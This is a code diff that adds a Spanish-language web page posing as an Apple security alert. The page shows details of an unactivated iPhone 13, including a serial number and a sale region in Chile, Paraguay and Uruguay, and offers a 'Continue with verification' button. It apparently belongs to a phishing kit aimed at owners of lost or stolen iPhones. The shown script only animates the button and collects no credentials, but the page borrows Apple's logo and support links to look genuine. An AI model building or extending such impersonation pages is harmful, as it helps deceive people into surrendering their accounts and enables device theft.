@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Alerta de Seguridad</title>
+    <link rel="stylesheet" href=".../styles.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+
+<body>
+    <div class="top-bar">
+        <div class="left">
+            <a href="https://support.apple.com" target="_blank" rel="noopener noreferrer">
+                <img src=".../appleicon.png" class="apple-logo" alt="Apple">
+            </a>
+
+        </div>
+        <div class="right">
+            <span class="dots">•••</span>
+            <div class="menu-popup" id="menuPopup">
+                <a href="https://support.apple.com/es-es/guide/icloud/welcome/icloud" class="menu-link"
+                    target="_blank">Manual de uso de iCloud</a>
+            </div>
+        </div>
+    </div>
+
+    <div class="alert-box">
+        <h1>Detalles del Dispositivo</h1>
+        <p class="intro-text">
+            Nuestros sistemas han registrado la siguiente información técnica del dispositivo en riesgo:
+        </p>
+        <div class="device-details">
+            <img src=".../iphone13.png" class="icloudimg" alt="iPhone 13">
+            <div class="device-info">
+                <p><strong>iPhone 13 (128GB) Azul</strong></p>
+                <p>iOS Version: <strong>16.2 (23C55)</strong></p>
+                <p>Activado: <strong>No</strong></p>
+                <p>Número de serie: <strong>H90JL2JCQ5</strong></p>
+                <p>Región de venta: <strong>Chile/Paraguay/Uruguay</strong></p>
+                <p>CPU: <strong>A15 Hexa</strong></p>
+                <p>Vida útil de batería: <strong>86%</strong></p>
+            </div>
+        </div>
+        <button class="btn" id="continueBtn">
+            <span class="btn-text">Continuar con verificación</span>
+            <span class="btn-loader pulse" style="display:none;"></span>
+        </button>
+    </div>
+</body>
+
+</html>
+
+<script>
+    const continueBtn = document.getElementById('continueBtn');
+    const btnText = continueBtn.querySelector('.btn-text');
+    const btnLoader = continueBtn.querySelector('.btn-loader');
+
+    continueBtn.addEventListener('click', () => {
+        btnText.style.display = 'none';
+        btnLoader.style.display = 'inline-block';
+        continueBtn.disabled = true;
+
+        setTimeout(() => {
+            btnLoader.style.display = 'none';
+            btnText.style.display = 'inline-block';
+            continueBtn.disabled = false;
+        }, 2500);
+    });
+
+</script>
+
+<script>
+    const dots = document.querySelector('.dots');
+    const menu = document.getElementById('menuPopup');
+
+    dots.addEventListener('click', () => {
+        menu.style.display = menu.style.display === 'block' ? 'none' : 'block';
+    });
+
+    document.addEventListener('click', (e) => {
+        if (!dots.contains(e.target) && !menu.contains(e.target)) {
+            menu.style.display = 'none';
+        }
+    });
+</script>
